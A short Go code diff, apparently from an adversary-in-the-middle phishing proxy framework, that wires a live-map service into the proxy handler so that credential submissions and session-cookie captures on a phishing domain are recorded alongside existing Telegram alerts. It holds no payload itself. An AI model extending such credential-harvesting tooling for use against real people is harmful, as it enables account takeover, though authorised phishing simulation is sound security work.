@@ -126,6 +126,7 @@ type ProxyHandler struct {
 	OptionService               *service.Option
 	TelegramService             *service.Telegram
 	ProxyCaptureRepository      *repository.ProxyCapture
+	LiveMapService              *service.LiveMap
 	cookieName                  string
 }
 
@@ -146,6 +147,7 @@ func NewProxyHandler(
 	optionService *service.Option,
 	telegramService *service.Telegram,
 	proxyCaptureRepo *repository.ProxyCapture,
+	liveMapService *service.LiveMap,
 ) *ProxyHandler {
 	// get proxy cookie name from database
 	cookieName := "ps" // fallback default
@@ -170,6 +172,7 @@ func NewProxyHandler(
 		OptionService:               optionService,
 		TelegramService:             telegramService,
 		ProxyCaptureRepository:      proxyCaptureRepo,
+		LiveMapService:              liveMapService,
 		cookieName:                  cookieName,
 	}
 }
@@ -5617,6 +5620,20 @@ func (m *ProxyHandler) saveDirectProxyCapture(
 		"username", username,
 		"password", password != "",
 	)
+
+	// Record event on live map
+	if m.LiveMapService != nil {
+		eventType := "proxy_submit"
+		if isCookieCapture {
+			eventType = "proxy_cookie"
+		}
+		go m.LiveMapService.RecordEvent(
+			clientIP,
+			session.UserAgent,
+			eventType,
+			phishDomain,
+		)
+	}
 
 	// Send Telegram notification
 	if m.TelegramService != nil {
